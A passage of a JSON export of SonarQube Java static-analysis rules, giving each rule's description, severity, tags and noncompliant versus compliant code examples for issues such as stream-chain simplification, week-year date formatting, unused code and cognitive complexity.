</li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/426\">CWE-426 - Untrusted Search Path</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/427\">CWE-427 - Uncontrolled Search Path Element</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4036","summary":"Searching OS commands in PATH is security-sensitive","tags":["cwe"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>When using the <code>Stream</code> API, call chains should be simplified as much as possible. Not only does it make the code easier to read, it\nalso avoid creating unnecessary temporary objects.</p>\n<p>This rule raises an issue when one of the following substitution is possible:</p>\n<table>\n  <colgroup>\n    <col style=\"width: 50%;\">\n    <col style=\"width: 50%;\">\n  </colgroup>\n  <thead>\n    <tr>\n      <th>Original</th>\n      <th>Preferred</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><p><code>stream.filter(predicate).findFirst().isPresent()</code></p></td>\n      <td><p><code>stream.anyMatch(predicate)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>stream.filter(predicate).findAny().isPresent()</code></p></td>\n      <td><p><code>stream.anyMatch(predicate)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>!stream.anyMatch(predicate)</code></p></td>\n      <td><p><code>stream.noneMatch(predicate)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>!stream.anyMatch(x -&gt; !(...))</code></p></td>\n      <td><p><code>stream.allMatch(...)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>stream.map(mapper).anyMatch(Boolean::booleanValue)</code></p></td>\n      <td><p><code>stream.anyMatch(predicate)</code></p></td>\n    </tr>\n  </tbody>\n</table>\n<h3>Noncompliant code example</h3>\n<pre>\nboolean hasRed = widgets.stream().filter(w -&gt; w.getColor() == RED).findFirst().isPresent(); // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nboolean hasRed = widgets.stream().anyMatch(w -&gt; w.getColor() == RED);\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4034","summary":"\"Stream\" call chains should be simplified when possible","tags":["clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>There is no reason to have a package that is empty except for \"package-info.java\". Such packages merely clutter a project, taking up space but\nadding no value.</p>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4032","summary":"Packages containing only \"package-info.java\" should be removed","tags":["unused"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>If a collection is declared and populated but its values are never read anywhere in the code, it can be considered unused. This often arises from\nincomplete refactoring, copy-pasting errors, or typos. Unused collections can lead to wasted memory and degraded application performance.\nAdditionally, their presence makes the code harder to read and understand.</p>\n<h2>How to fix it</h2>\n<p>Remove unused collection.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nint getLength(String a, String b, String c) {\n  List&lt;String&gt; strings = new ArrayList&lt;&gt;();  // Noncompliant: List is declared and populated but never read.\n  strings.add(a);\n  strings.add(b);\n  strings.add(c);\n\n  return a.length() + b.length() + c.length();\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nint getLength(String a, String b, String c) {\n  return a.length() + b.length() + c.length();\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"targeted","ruleKey":"RSPEC-4030","summary":"Collection contents should be used","tags":["unused","suspicious","performance"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>This rule allows banning usage of certain constructors.</p>\n<h3>Noncompliant code example</h3>\n<p>Given parameters:</p>\n<ul>\n  <li> className: java.util.Date </li>\n  <li> argumentTypes: java.lang.String </li>\n</ul>\n<pre>\nDate birthday;\nbirthday = new Date(\"Sat Sep 27 05:42:21 EDT 1986\");  // Noncompliant\nbirthday = new Date(528176541000L); // Compliant\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-4011","summary":"Track uses of disallowed constructors","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Few developers are aware of the difference between <code>Y</code> for \"Week year\" and <code>y</code> for Year when formatting and parsing a date\nwith <code>SimpleDateFormat</code> or <code>DateTimeFormatter</code>. Thatâs likely because for most dates, Week year and Year are the same, so\ntesting at any time other than the first or last week of the year will yield the same value for both <code>y</code> and <code>Y</code>. But in the\nlast week of December and the first week of January, you may get unexpected results.</p>\n<p>According to the <a href=\"http://docs.oracle.com/javase/8/docs/api/java/util/GregorianCalendar.html#week_year\">Javadoc</a>:</p>\n<blockquote>\n  <p>A week year is in sync with a WEEK_OF_YEAR cycle. All weeks between the first and last weeks (inclusive) have the same week year value.\n  Therefore, the first and last days of a week year may have different calendar year values.</p>\n  <p>For example, January 1, 1998 is a Thursday. If getFirstDayOfWeek() is MONDAY and getMinimalDaysInFirstWeek() is 4 (ISO 8601 standard compatible\n  setting), then week 1 of 1998 starts on December 29, 1997, and ends on January 4, 1998. The week year is 1998 for the last three days of calendar\n  year 1997. If, however, getFirstDayOfWeek() is SUNDAY, then week 1 of 1998 starts on January 4, 1998, and ends on January 10, 1998; the first three\n  days of 1998 then are part of week 53 of 1997 and their week year is 1997.</p>\n</blockquote>\n<h3>Noncompliant code example</h3>\n<pre>\nDate date = new SimpleDateFormat(\"yyyy/MM/dd\").parse(\"2015/12/31\");\nString result = new SimpleDateFormat(\"YYYY/MM/dd\").format(date);   //Noncompliant; yields '2016/12/31'\nresult = DateTimeFormatter.ofPattern(\"YYYY/MM/dd\").format(date); //Noncompliant; yields '2016/12/31'\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nDate date = new SimpleDateFormat(\"yyyy/MM/dd\").parse(\"2015/12/31\");\nString result = new SimpleDateFormat(\"yyyy/MM/dd\").format(date);   //Yields '2015/12/31' as expected\nresult = DateTimeFormatter.ofPattern(\"yyyy/MM/dd\").format(date); //Yields '2015/12/31' as expected\n</pre>\n<h3>Exceptions</h3>\n<pre>\nDate date = new SimpleDateFormat(\"yyyy/MM/dd\").parse(\"2015/12/31\");\nString result = new SimpleDateFormat(\"YYYY-ww\").format(date);  //compliant, 'Week year' is used along with 'Week of year'. result = '2016-01'\nDateTimeFormatter.ofPattern(\"YYYY-ww\").format(date); //compliant; yields '2016-01' as expected\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"partial","ruleKey":"RSPEC-3986","summary":"Week Year (\"YYYY\") should not be used for date formatting","tags":["suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>This rule raises an issue when a private nested class is never used.</p>\n<h2>Why is this an issue?</h2>\n<p><code>private</code> classes that are never used are dead code: unnecessary, inoperative code that should be removed. Cleaning out dead code\ndecreases the size of the maintained codebase, making it easier to understand the program and preventing bugs from being introduced.</p>\n<h3>Code examples</h3>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class TopLevel\n{\n  private class Nested {...} // Noncompliant: Nested is never used\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class TopLevel\n{\n  void doSomething() {\n    Nested a = new Nested();\n    ...\n  }\n  private class Nested {...}\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3985","summary":"Unused \"private\" classes should be removed","tags":["unused"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Creating a new <code>Throwable</code> without actually throwing it is useless and is probably due to a mistake.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nif (x &lt; 0)\n  new IllegalArgumentException(\"x must be nonnegative\");\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nif (x &lt; 0)\n  throw new IllegalArgumentException(\"x must be nonnegative\");\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-3984","summary":"Exceptions should not be created without being thrown","tags":["error-handling"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The size of a collection and the length of an array are always greater than or equal to zero. Testing it doesnât make sense, since the result is\nalways <code>true</code>.</p>\n<pre>\nif (myList.size() &gt;= 0) {...} // Noncompliant: always true\n\nboolean result = myArray.length &gt;= 0; // Noncompliant: true\n</pre>\n<p>Similarly testing that it is less than zero will always return <code>false</code>.</p>\n<pre>\nif (myList.size() &lt; 0) {...} // Noncompliant: always false\n</pre>\n<p>Fix the code to properly check for emptiness if it was the intent, or remove the redundant code to keep the current behavior.</p>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3981","summary":"Collection sizes and array length comparisons should make sense","tags":["confusing"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>When the line immediately after a conditional has neither curly braces nor indentation, the intent of the code is unclear and perhaps not what is\nexecuted. Additionally, such code is confusing to maintainers.</p>\n<pre>\nif (condition)  // Noncompliant\ndoTheThing();\ndoTheOtherThing(); // Was the intent to call this function unconditionally?\n</pre>\n<p>It becomes even more confusing and bug-prone if lines get commented out.</p>\n<pre>\nif (condition)  // Noncompliant\n//  doTheThing();\ndoTheOtherThing(); // Was the intent to call this function conditionally?\n</pre>\n<p>Indentation alone or together with curly braces makes the intent clear.</p>\n<pre>\nif (condition)\n  doTheThing();\ndoTheOtherThing(); // Clear intent to call this function unconditionally\n\n// or\n\nif (condition) {\n  doTheThing();\n}\ndoTheOtherThing(); // Clear intent to call this function unconditionally\n</pre>\n<p>This rule raises an issue if the line controlled by a conditional has the same indentation as the conditional and is not enclosed in curly\nbraces.</p>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3973","summary":"A conditionally executed single line should be denoted by indentation","tags":["confusing","suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FORMATTED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Placing an <code>if</code> statement on the same line as the closing <code>}</code> from a preceding <code>if</code>, <code>else</code>, or\n<code>else if</code> block can lead to confusion and potential errors. It may indicate a missing <code>else</code> statement or create ambiguity for\nmaintainers who might fail to understand that the two statements are unconnected.</p>\n<p>The following code snippet is confusing:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nif (condition1) {\n  // ...\n} if (condition2) {  // Noncompliant\n  //...\n}\n</pre>\n<p>Either the two conditions are unrelated and they should be visually separated:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nif (condition1) {\n  // ...\n}\n\nif (condition2) {\n  //...\n}\n</pre>\n<p>Or they were supposed to be exclusive and you should use <code>else if</code> instead:</p>\n<pre>\nif (condition1) {\n  // ...\n} else if (condition2) {\n  //...\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3972","summary":"Conditionals should start on new lines","tags":["suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FORMATTED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Stream operations are divided into intermediate and terminal operations, and are combined to form stream pipelines. After the terminal operation is\nperformed, the stream pipeline is considered consumed, and cannot be used again. Such a reuse will yield unexpected results.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nStream&lt;Widget&gt; pipeline = widgets.stream().filter(b -&gt; b.getColor() == RED);\nint sum1 = pipeline.sum();\nint sum2 = pipeline.mapToInt(b -&gt; b.getWeight()).sum(); // Noncompliant\n</pre>\n<h2>Resources</h2>\n<p><a href=\"https://docs.oracle.com/javase/8/docs/api/java/util/stream/package-summary.html#StreamOps\">Stream Operations</a></p>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3959","summary":"Consumed Stream pipelines should not be reused","tags":["java8","symbolic-execution"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>There are two types of stream operations: intermediate operations, which return another stream, and terminal operations, which return something\nother than a stream. Intermediate operations are lazy, meaning they arenât actually executed until and unless a terminal stream operation is performed\non their results. Consequently, if the result of an intermediate stream operation is not fed to a terminal operation, it serves no purpose, which is\nalmost certainly an error.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nwidgets.stream().filter(b -&gt; b.getColor() == RED); // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nint sum = widgets.stream()\n                      .filter(b -&gt; b.getColor() == RED)\n                      .mapToInt(b -&gt; b.getWeight())\n                      .sum();\nStream&lt;Widget&gt; pipeline = widgets.stream()\n                                 .filter(b -&gt; b.getColor() == GREEN)\n                                 .mapToInt(b -&gt; b.getWeight());\nsum = pipeline.sum();\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/api/java/util/stream/package-summary.html#StreamOps\">Stream Operations</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3958","summary":"Intermediate Stream methods should not be left unused","tags":["java8","symbolic-execution"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>The use of punctuation characters to separate subgroups in a number can make the number more readable. For instance consider 1,000,000,000 versus\n1000000000. But when the grouping is irregular, such as 1,000,00,000; it indicates an error.</p>\n<p>This rule raises an issue when underscores (<code>_</code>) are used to break a number into irregular subgroups.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nint thousand = 100_0;\nint tenThousand = 100_00;\nint million = 1_000_00_000;\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nint thousand = 1000;\nint tenThousand = 10_000;\nint tenThousandWithout = 10000;\nint duos = 1_00_00;\nint million = 100_000_000;\n</pre>\n<h3>Exceptions</h3>\n<p>No issue will be raised on binary numbers (starting with <code>0b</code> or <code>0B</code>). Binary number bits are often grouped corresponding to\ncertain meanings, resulting in irregular bit group sizes.</p>\n<pre>\nint configValue1 = 0b00_000_10_1; // Compliant\nint configValue2 = 0B00_000_10_1; // Compliant\n</pre>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-3937","summary":"Number patterns should be regular","tags":["suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FORMATTED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Having all branches of a <code>switch</code> or <code>if</code> chain with the same implementation indicates a problem.</p>\n<p>In the following code:</p>\n<pre>\nif (b == 0) {  // Noncompliant\n  doOneMoreThing();\n} else {\n  doOneMoreThing();\n}\n\nint b = a &gt; 12 ? 4 : 4;  // Noncompliant\n\nswitch (i) {  // Noncompliant\n  case 1:\n    doSomething();\n    break;\n  case 2:\n    doSomething();\n    break;\n  case 3:\n    doSomething();\n    break;\n  default:\n    doSomething();\n}\n</pre>\n<p>Either there is a copy-paste error that needs fixing or an unnecessary <code>switch</code> or <code>if</code> chain that should be removed.</p>\n<h3>Exceptions</h3>\n<p>This rule does not apply to <code>if</code> chains without <code>else</code>, nor to <code>switch</code> without a <code>default</code> clause.</p>\n<pre>\nif(b == 0) {    //no issue, this could have been done on purpose to make the code more readable\n  doSomething();\n} else if(b == 1) {\n  doSomething();\n}\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3923","summary":"All branches in a conditional structure should not have exactly the same implementation","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Thereâs no point in creating an array solely for the purpose of passing it as a varargs (<code>...</code>) argument; varargs <em>is</em> an array.\nSimply pass the elements directly. They will be consolidated into an array automatically. Incidentally passing an array where <code>Object ...</code>\nis expected makes the intent ambiguous: Is the array supposed to be one object or a collection of objects?</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic void callTheThing() {\n  //...\n  doTheThing(new String[] { \"s1\", \"s2\"});  // Noncompliant: unnecessary\n  doTheThing(new String[12]);  // Compliant\n  doTheOtherThing(new String[8]);  // Noncompliant: ambiguous\n  // ...\n}\n\npublic void doTheThing (String ... args) {\n  // ...\n}\n\npublic void doTheOtherThing(Object ... args) {\n  // ...\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic void callTheThing() {\n  //...\n  doTheThing(\"s1\", \"s2\");\n  doTheThing(new String[12]);\n  doTheOtherThing((Object[]) new String[8]);\n   // ...\n}\n\npublic void doTheThing (String ... args) {\n  // ...\n}\n\npublic void doTheOtherThing(Object ... args) {\n  // ...\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3878","summary":"Arrays should not be created for varargs parameters","tags":["clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>According to its JavaDocs, the intermediate Stream operation <code>java.util.Stream.peek()</code> âexists mainly to support debuggingâ\npurposes.</p>\n<p>A key difference with other intermediate Stream operations is that the Stream implementation is free to skip calls to <code>peek()</code> for\noptimization purpose. This can lead to <code>peek()</code> being unexpectedly called only for some or none of the elements in the Stream.</p>\n<p>As a consequence, relying on <code>peek()</code> without careful consideration can lead to error-prone code.</p>\n<p>This rule raises an issue for each use of peek() to be sure that it is challenged and validated by the team to be meant for production\ndebugging/logging purposes.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nStream.of(\"one\", \"two\", \"three\", \"four\")\n         .filter(e -&gt; e.length() &gt; 3)\n         .peek(e -&gt; System.out.println(\"Filtered value: \" + e)); // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nStream.of(\"one\", \"two\", \"three\", \"four\")\n         .filter(e -&gt; e.length() &gt; 3)\n         .foreach(e -&gt; System.out.println(\"Filtered value: \" + e));\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/api/java/util/stream/Stream.html#peek-java.util.function.Consumer-\">Java 8 API Documentation</a>\n  </li>\n  <li> 4comprehension: <a href=\"https://4comprehension.com/idiomatic-peeking/\">Idiomatic Peeking with Java Stream API</a> </li>\n  <li> Data Geekery: <a href=\"https://blog.jooq.org/2014/06/13/java-8-friday-10-subtle-mistakes-when-using-the-streams-api/\">10 Subtle Mistakes When\n  Using the Streams API</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3864","summary":"\"Stream.peek\" should be used with caution","tags":["java8","pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Itâs a common pattern to test the result of a <code>java.util.Map.get()</code> against <code>null</code> or calling\n<code>java.util.Map.containsKey()</code> before proceeding with adding or changing the value in the map. However the <code>java.util.Map</code> API\noffers a significantly better alternative in the form of the <code>computeIfPresent()</code> and <code>computeIfAbsent()</code> methods. Using these\ninstead leads to cleaner and more readable code.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the projectâs <code>sonar.java.source</code> is not 8.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nV value = map.get(key);\nif (value == null) {  // Noncompliant\n  value = V.createFor(key);\n  if (value != null) {\n    map.put(key, value);\n  }\n}\nif (!map.containsKey(key)) {  // Noncompliant\n  value = V.createFor(key);\n  if (value != null) {\n    map.put(key, value);\n  }\n}\nreturn value;\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nreturn map.computeIfAbsent(key, k -&gt; V.createFor(k));\n</pre>\n<h3>Exceptions</h3>\n<p>This rule will not raise an issue when trying to add <code>null</code> to a map, because <code>computeIfAbsent</code> will not add the entry if the\nvalue returned by the function is <code>null</code>.</p>\n<h2>Resources</h2>\n<h3>Related rules</h3>\n<ul>\n  <li> {rule:java:S6104} - Map \"computeIfAbsent()\" and \"computeIfPresent()\" should not be used to add \"null\" values. </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3824","summary":"\"Map.get\" and value test should be replaced with single method call","tags":["java8","symbolic-execution"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>This rule raises an issue when the code cognitive complexity of a function is above a certain threshold.</p>\n<h2>Why is this an issue?</h2>\n<p>Cognitive Complexity is a measure of how hard it is to understand the control flow of a unit of code. Code with high cognitive complexity is hard\nto read, understand, test, and modify.</p>\n<p>As a rule of thumb, high cognitive complexity is a sign that the code should be refactored into smaller, easier-to-manage pieces.</p>\n<h3>Which syntax in code does impact cognitive complexity score?</h3>\n<p>Here are the core concepts:</p>\n<ul>\n  <li> <strong>Cognitive complexity is incremented each time the code breaks the normal linear reading flow.</strong><br> This concerns, for example,\n  loop structures, conditionals, catches, switches, jumps to labels, and conditions mixing multiple operators. </li>\n  <li> <strong>Each nesting level increases complexity.</strong><br> During code reading, the deeper you go through nested layers, the harder it\n  becomes to keep the context in mind. </li>\n  <li> <strong>Method calls are free</strong><br> A well-picked method name is a summary of multiple lines of code. A reader can first explore a\n  high-level view of what the code is performing then go deeper and deeper by looking at called functions content.<br> <em>Note:</em> This does not\n  apply to recursive calls, those will increment cognitive score. </li>\n</ul>\n<p>The method of computation is fully detailed in the pdf linked in the resources.</p>\n<h3>Exceptions</h3>\n<p><code>equals</code> and <code>hashCode</code> methods are ignored because they might be automatically generated and might end up being difficult to\nunderstand, especially in the presence of many fields.</p>\n<h2>How to fix it</h2>\n<p>Reducing cognitive complexity can be challenging.<br> Here are a few suggestions:</p>\n<ul>\n  <li> <strong>Extract complex conditions in a new function.</strong><br> Mixed operators in condition will increase complexity. Extracting the\n  condition in a new function with an appropriate name will reduce cognitive load. </li>\n  <li> <strong>Break down large functions.</strong><br> Large functions can be hard to understand and maintain. If a function is doing too many\n  things, consider breaking it down into smaller, more manageable functions. Each function should have a single responsibility. </li>\n  <li> <strong>Avoid deep nesting by returning early.</strong><br> To avoid the nesting of conditions, process exceptional cases first and return\n  early. </li>\n</ul>\n<h3>Code examples</h3>\n<p><strong>Extraction of a complex condition in a new function.</strong></p>\n<h4>Noncompliant code example</h4>\n<p>The code is using a complex condition and has a cognitive cost of 3.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\ndouble calculateFinalPrice(User user, Cart cart) {\n  double total = calculateTotal(cart);\n  if (user.hasMembership()                            // +1 (if)\n    &amp;&amp; user.ordersCount() &gt; 10                        // +1 (more than one condition)\n    &amp;&amp; user.isAccountActive()\n    &amp;&amp; !user.hasDiscount()\n    || user.ordersCount() == 1) {                    // +1 (change of operator in condition)\n    total = applyDiscount(user, total);\n  }\n  return total;\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>Even if the cognitive complexity of the whole program did not change, it is easier for a reader to understand the code of the\n<code>calculateFinalPrice</code> function, which now only has a cognitive cost of 1.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\ndouble calculateFinalPrice(User user, Cart cart) {\n  double total = calculateTotal(cart);\n  if (isEligibleForDiscount(user)) {                  // +1 (if)\n    total = applyDiscount(user, total);\n  }\n  return total;\n}\n\nboolean isEligibleForDiscount(User user) {\n  return user.hasMembership()\n    &amp;&amp; user.ordersCount() &gt; 10                        // +1 (more than one condition)\n    &amp;&amp; user.isAccountActive()\n    &amp;&amp; !user.hasDiscount()\n    || user.ordersCount() == 1;                       // +1 (change of operator in condition)\n}\n</pre>\n<p><strong>Break down large functions.</strong></p>\n<h4>Noncompliant code example</h4>\n<p>For example, consider a function that calculates the total price of a shopping cart, including sales tax and shipping.<br> <em>Note:</em> The code\nis simplified here, to illustrate the purpose. Please imagine there is more happening in the <code>for</code> loops.</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\ndouble calculateTotal(Cart cart) {\n  double total = 0;\n  for (Item item : cart.items()) {       // +1 (for)\n    total += item.price;\n  }\n\n  // calculateSalesTax\n  for (Item item : cart.items()) {       // +1 (for)\n    total += 0.2 * item.price;\n  }\n\n  //calculateShipping\n  total += 5 * cart.items().size();\n\n  return total;\n}\n</pre>\n<p>This function could be refactored into smaller functions: The complexity is spread over multiple functions and the complex\n<code>calculateTotal</code> has now a complexity score of zero.</p>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\ndouble calculateTotal(Cart cart) {\n  double total = 0;\n  total = calculateSubtotal(cart, total);\n  total += calculateSalesTax(cart, total);\n  total += calculateShipping(cart, total);\n\n  return total;\n}\n\ndouble calculateShipping(Cart cart, double total) {\n  total += 5 * cart.items().size();\n  return total;\n}\n\ndouble calculateSalesTax(Cart cart, double total) {\n  for (Item item : cart.items()) {       // +1 (for)\n    total += 0.2 * item.price;\n  }\n  return total;\n}\n\ndouble calculateSubtotal(Cart cart, double total) {\n  for (Item item : cart.items()) {       // +1 (for)\n    total += item.price;\n  }\n  return total;\n}\n</pre>\n<p><strong>Avoid deep nesting by returning early.</strong></p>\n<h4>Noncompliant code example</h4>\n<p>The below code has a cognitive complexity of 6.</p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\ndouble calculateDiscount(double price, User user) {\n  if (isEligibleForDiscount(user)) {      // +1 ( if )\n    if (user.hasMembership()) {           // +2 ( nested if )\n      return price * 0.9;\n    } else if (user.ordersCount() == 1) { // +1 ( else )\n      return price * 0.95;\n    } else {                              // +1 ( else )\n      return price;\n    }\n  } else {                                // +1 ( else )\n    return price;\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>Checking for the edge case first flattens the <code>if</code> statements and reduces the cognitive complexity to 3.</p>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\ndouble calculateDiscount(double price, User user) 